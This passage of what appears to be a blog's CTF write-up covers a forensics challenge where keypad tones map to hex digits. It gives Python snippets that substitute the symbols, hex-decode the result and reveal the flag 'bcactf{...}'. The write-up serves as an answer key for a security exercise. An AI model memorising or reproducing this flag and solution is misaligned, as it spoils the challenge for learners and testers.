#556A5354B46D5AABB945556266AB4D4#48AA6#A155B456B5486*68A8436A5166B7454A586044485DA445AAB349425567584B56A8BB4D4648</code></p><p>Then we do the keys substituition as replacing <code>123A456B789C*0#D</code> by <code>0123456789ABCDEF</code> and print the hex decoded value using python.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">input_string = <span class="string">&quot;xpdReWEfno4BtvReUHxu8tBrknyUh128DolsWh1oz7cnUDygIxkCItws05vN8SdkFpTPRvVNUcRTtoS7zEUaf7ONI3n0UtVuIli9BcPfxECYmDI_4E3rJAUhYGV9wOFI&quot;</span></span><br><span class="line"></span><br><span class="line">hex_indices = [</span><br><span class="line">    <span class="number">0x61</span>, <span class="number">0x72</span>, <span class="number">0x6c</span>, <span class="number">0x38</span>, <span class="number">0x2b</span>, <span class="number">0x6f</span>, <span class="number">0x3e</span>, <span class="number">0x59</span>, <span class="number">0x6c</span>, <span class="number">0x38</span>, </span><br><span class="line">    <span class="number">0x19</span>, <span class="number">0x6f</span>, <span class="number">0x1d</span>, <span class="number">0x72</span>, <span class="number">0x0a</span>, <span class="number">0x45</span>, <span class="number">0x59</span>, <span class="number">0x6f</span>, <span class="number">0x6c</span>, <span class="number">0x2e</span>, </span><br><span class="line">    <span class="number">0x6f</span>, <span class="number">0x6c</span>, <span class="number">0x26</span>, <span class="number">0x2b</span>, <span class="number">0x02</span>, <span class="number">0x6f</span>, <span class="number">0x01</span>, <span class="number">0x26</span>, <span class="number">0x72</span>, <span class="number">0x53</span>, </span><br><span class="line">    <span class="number">0x39</span>, <span class="number">0x04</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">resultant_string = <span class="string">&#x27;&#x27;</span>.join(input_string[index] <span class="keyword">for</span> index <span class="keyword">in</span> hex_indices)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(resultant_string)</span><br></pre></td></tr></table></figure><p>Then we get the following message:</p><p><img src="/./images/Touch_Tone_Telephone_1.png" alt="Image 1"></p><p>Now comes the part to reverse this code so we write another code to solve this task which extract the characters of the flag based on the given indices of the garbage given in the end.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mapping = &#123;</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;3&#x27;</span>: <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;A&#x27;</span>: <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>: <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>: <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;7&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;*&#x27;</span>: <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;#&#x27;</span>: <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;F&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">encoded_str = (<span class="string">&quot;47656*6*6D3#315B656*6A6D606531B46D31B4676531434A424A54463147656*B16*686#653#19546768BA316A626*6*316062B831636531B3656A6DB364656431666DB331B2B5626*68B4B83162BABAB5B3626#6A6531B1B5B3B16DBA65BA3#1919466DB3316A6762B33131A13*316B65B431686#6465B731A1B7A6A23#19466DB3316A6762B33131A23*316B65B431686#6465B731A1B7ABA33#19466DB3316A6762B33131A33*316B65B431686#6465B731A1B7A66A3#19466DB3316A6762B33131AA3*316B65B431686#6465B731A1B7AAA73#19466DB3316A6762B33131A43*316B65B431686#6465B731A1B7A3633#19466DB3316A6762B33131A53*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B33131A63*316B65B431686#6465B731A1B7AA653#19466DB3316A6762B33131AB3*316B65B431686#6465B731A1B7A5A83#19466DB3316A6762B33131A73*316B65B431686#6465B731A1B7A66A3#19466DB3316A6762B33131A83*316B65B431686#6465B731A1B7AAA73#19466DB3316A6762B331A2A13*316B65B431686#6465B731A1B7A2A83#19466DB3316A6762B331A2A23*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B331A2A33*316B65B431686#6465B731A1B7A2643#19466DB3316A6762B331A2AA3*316B65B431686#6465B731A1B7ABA33#19466DB3316A6762B331A2A43*316B65B431686#6465B731A1B7A1623#19466DB3316A6762B331A2A53*316B65B431686#6465B731A1B7A4A53#19466DB3316A6762B331A2A63*316B65B431686#6465B731A1B7A5A83#19466DB3316A6762B331A2AB3*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B331A2A73*316B65B431686#6465B731A1B7A66A3#19466DB3316A6762B331A2A83*316B65B431686#6465B731A1B7A3653#19466DB3316A6762B331A3A13*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B331A3A23*316B65B431686#6465B731A1B7A66A3#19466DB3316A6762B331A3A33*316B65B431686#6465B731A1B7A3A63#19466DB3316A6762B331A3AA3*316B65B431686#6465B731A1B7A3633#19466DB3316A6762B331A3A43*316B65B431686#6465B731A1B7A1A33#19466DB3316A6762B331A3A53*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B331A3A63*316B65B431686#6465B731A1B7A1A23#19466DB3316A6762B331A3AB3*316B65B431686#6465B731A1B7A3A63#19466DB3316A6762B331A3A73*316B65B431686#6465B731A1B7ABA33#19466DB3316A6762B331A3A83*316B65B431686#6465B731A1B7A5AA3#19466DB3316A6762B331AAA13*316B65B431686#6465B731A1B7AAA83#19466DB3316A6762B331AAA23*316B65B431686#6465B731A1B7A1A43#191919516*6562BA6531676D6*6431BB67686*6531BB6531BA656#6431B86DB531B3626#646D60316B62B363626B6531B46762B431B86DB531BA676DB56*6431686#6465B731686#B46D31B46D316B65B431B4676531666*626B3#195B67656#31B86DB53BB3653166686#68BA6765643*3160626C6531BAB5B36531B46D31BBB362B131B4676531666*626B31686#31B4676531B1B36DB165B331666DB36062B43#19B7B16453655B45666#6DA443B4B653655547B7B5A7B443B36C6#B85567A2A3A7446D6*BA5B67A26DB9AB6A6#5544B86B48B76C4A48B4BBBAA1A5B64#A75A646C46B1545153B6564#556A5354B46D5AABB945556266AB4D4#48AA6#A155B456B5486*68A8436A5166B7454A586044485DA445AAB349425567584B56A8BB4D4648&quot;</span>)</span><br><span class="line"></span><br><span class="line">decoded_str = <span class="string">&#x27;&#x27;</span>.join(mapping.get(char, char) <span class="keyword">for</span> char <span class="keyword">in</span> encoded_str)</span><br><span class="line"></span><br><span class="line">bytes_obj = <span class="built_in">bytes</span>.fromhex(decoded_str)</span><br><span class="line">result_string = bytes_obj.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(result_string) </span><br></pre></td></tr></table></figure><p>And that reveals us our flag:</p><p><code>bcactf&#123;l3m0n_d3m0n_134v3_my_m1nd_p13a5e&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF-Writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Forensics </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
